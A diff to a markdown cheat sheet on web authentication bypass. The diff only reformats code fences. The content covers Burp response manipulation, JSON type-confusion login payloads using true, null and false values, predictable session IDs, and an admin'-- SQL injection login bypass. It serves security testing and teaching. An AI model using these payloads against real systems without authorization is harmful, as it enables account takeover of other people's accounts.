@@ -22,19 +22,19 @@ On Burp Proxy, enable the intercept and capture the request. Then right-click th
 Example:
 
 	Request:
-	```
+```
 	{
 		"username":"admin",
 		"password":"pass"
 	}
-	```
+```
 
 	Response:
-	```
+```
 	{
 		"login_status":false
 	}
-	```
+```
 
 	Then change "false" to "true" and access the endpoint that comes after authentication.
 
@@ -46,52 +46,52 @@ Note: Response manipulation doesn't always constitute a vulnerability. For examp
 Some systems that use "application/x-www-form-urlencoded" data accept "application/json" data instead. At this point, these can be try:
 
 - Login with admin or any other account
-	```
+```
 	{
 		"username":"admin",
 		"password":true
 	}
-	```
+```
 - Login with "true:true":
-	```
+```
 	{
 		"username":true,
 		"password":true
 	}
-	```
+```
 - Login just username:
-	```
+```
 	{
 		"username":"admin"
 	}
-	```
+```
 - Probably not login but it can be information disclouse on error message:
 
-	```
+```
 	{
 		"username":null,
 		"password":null
 	}
-	```
+```
 	
-	```
+```
 	{
 		"username":null
 	}
-	```
+```
 
-	```
+```
 	{
 		"password":null
 	}
-	```
+```
 
-	```
+```
 	{
 		"username":false,
 		"password":false
 	}
-	```
+```
 	
 ### >_ Refresh Token Endpoint Misconfiguration
 1-Login creates a token: When a user logs in with valid credentials, the application generates a Bearer Authentication token. This token is used to access other parts of the application.
@@ -124,23 +124,23 @@ Some systems use predictible session id. So in this case just predict the sessio
 
 For Example:
 	
-	```
-	session_id=112484697 >> your session id
-	session_id=112484724 >> admin session id
-	```
+```
+session_id=112484697 >> your session id
+session_id=112484724 >> admin session id
+```
 	
 ### >_ Authentication Bypass via SQLi
 Many authentication mechanisms use SQL queries to check user credentials. If these queries are not properly sanitized, SQL Injection (SQLi) can occur, allowing login bypass. For example, consider a login form that executes:
 
-	```
-	SELECT * FROM users WHERE username = '$username' AND password = '$password';
-	```
+```
+SELECT * FROM users WHERE username = '$username' AND password = '$password';
+```
 	
 If the username is set to admin'-- and the password is left blank, the query becomes:
 
-	```
-	SELECT * FROM users WHERE username = 'admin'--' AND password = '';
-	```
+```
+SELECT * FROM users WHERE username = 'admin'--' AND password = '';
+```
 The -- comments out the password check, so login succeeds without knowing the actual password.	
 
 ### >_ Referances
@@ -148,6 +148,7 @@ The -- comments out the password check, so login succeeds without knowing the ac
 - https://www.synack.com/exploits-explained/exploits-explained-5-unusual-authentication-bypass-techniques/
 - https://portswigger.net/support/using-sql-injection-to-bypass-authentication
 - https://www.youtube.com/watch?v=DBNmAJaWcGk
+
 
 
 
